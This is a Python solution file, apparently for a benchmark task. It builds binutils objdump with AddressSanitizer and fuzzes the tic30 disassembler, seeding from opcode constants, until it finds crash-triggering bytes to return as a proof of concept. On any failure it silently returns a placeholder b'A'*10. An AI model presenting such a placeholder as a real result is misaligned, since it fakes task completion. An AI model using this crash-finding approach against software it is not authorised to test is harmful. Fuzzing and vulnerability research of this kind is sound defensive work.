import os
import sys
import tarfile
import subprocess
import tempfile
import shutil
import re
import struct
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        # Create a temporary directory for build and execution
        work_dir = tempfile.mkdtemp()
        
        try:
            # 1. Extract the source code
            with tarfile.open(src_path) as tar:
                tar.extractall(path=work_dir)
            
            # Locate the root of the source tree (containing configure)
            src_root = None
            for root, dirs, files in os.walk(work_dir):
                if 'configure' in files and 'opcodes' in dirs:
                    src_root = root
                    break
            
            if not src_root:
                for root, dirs, files in os.walk(work_dir):
                    if 'configure' in files:
                        src_root = root
                        break
            
            if not src_root:
                return b"A" * 10

            # 2. Extract potential opcode seeds from tic30-dis.c
            seeds = set()
            tic30_path = None
            for root, dirs, files in os.walk(src_root):
                if 'tic30-dis.c' in files:
                    tic30_path = os.path.join(root, 'tic30-dis.c')
                    break
            
            if tic30_path:
                try:
                    with open(tic30_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        # Find hex constants that look like opcodes
                        hex_vals = re.findall(r'0x[0-9a-fA-F]+', content)
                        for hv in hex_vals:
                            try:
                                val = int(hv, 16)
                                if 0 <= val <= 0xFFFFFFFF:
                                    seeds.add(val)
                            except:
                                pass
                except:
                    pass
            
            seed_list = list(seeds)
            if not seed_list:
                seed_list = [0x60000000, 0x0]

            # 3. Compile objdump with AddressSanitizer
            build_dir = os.path.join(work_dir, "build")
            os.makedirs(build_dir, exist_ok=True)
            
            env = os.environ.copy()
            env['CFLAGS'] = "-g -O0 -w -fsanitize=address"
            env['LDFLAGS'] = "-fsanitize=address"
            
            # Configure
            subprocess.run(
                [
                    os.path.join(src_root, "configure"),
                    "--disable-nls",
                    "--disable-gdb",
                    "--disable-werror",
                    "--enable-targets=all",
                    "--disable-shared",
                    "--disable-readline",
                    "--disable-sim",
                    "--disable-libdecnumber",
                    "--disable-gdbserver"
                ],
                cwd=build_dir,
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True
            )
            
            # Build
            subprocess.run(
                ["make", "-j8", "all-binutils"],
                cwd=build_dir,
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True
            )
            
            # Find the objdump binary
            objdump_bin = None
            for root, dirs, files in os.walk(build_dir):
                if "objdump" in files:
                    path = os.path.join(root, "objdump")
                    if os.access(path, os.X_OK):
                        objdump_bin = path
                        break
            
            if not objdump_bin:
                for root, dirs, files in os.walk(build_dir):
                    if "objdump.exe" in files:
                        path = os.path.join(root, "objdump.exe")
                        if os.access(path, os.X_OK):
                            objdump_bin = path
                            break
            
            if not objdump_bin:
                return b"A" * 10

            # 4. Fuzzing Loop
            fuzz_input_path = os.path.join(work_dir, "fuzz.bin")
            random.shuffle(seed_list)
            
            for seed in seed_list:
                for endian in ['>I', '<I']:
                    try:
                        base = struct.pack(endian, seed)
                    except:
                        continue
                    
                    # Try variations
                    for _ in range(5):
                        suffix = bytearray(random.getrandbits(8) for _ in range(6))
                        poc = base + suffix
                        
                        with open(fuzz_input_path, "wb") as f:
                            f.write(poc)
                        
                        proc = subprocess.run(
                            [objdump_bin, "-D", "-b", "binary", "-m", "tic30", fuzz_input_path],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.PIPE,
                            env=env
                        )
                        
                        if proc.returncode != 0:
                            stderr_output = proc.stderr.decode(errors='ignore')
                            if "AddressSanitizer" in stderr_output or proc.returncode == -11:
                                return bytes(poc)

            # Fallback to pure random
            for _ in range(1000):
                poc = bytearray(random.getrandbits(8) for _ in range(10))
                with open(fuzz_input_path, "wb") as f:
                    f.write(poc)
                
                proc = subprocess.run(
                    [objdump_bin, "-D", "-b", "binary", "-m", "tic30", fuzz_input_path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    env=env
                )
                
                if proc.returncode != 0:
                    stderr_output = proc.stderr.decode(errors='ignore')
                    if "AddressSanitizer" in stderr_output or proc.returncode == -11:
                        return bytes(poc)

            return b"A" * 10
            
        except Exception:
            return b"A" * 10
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)
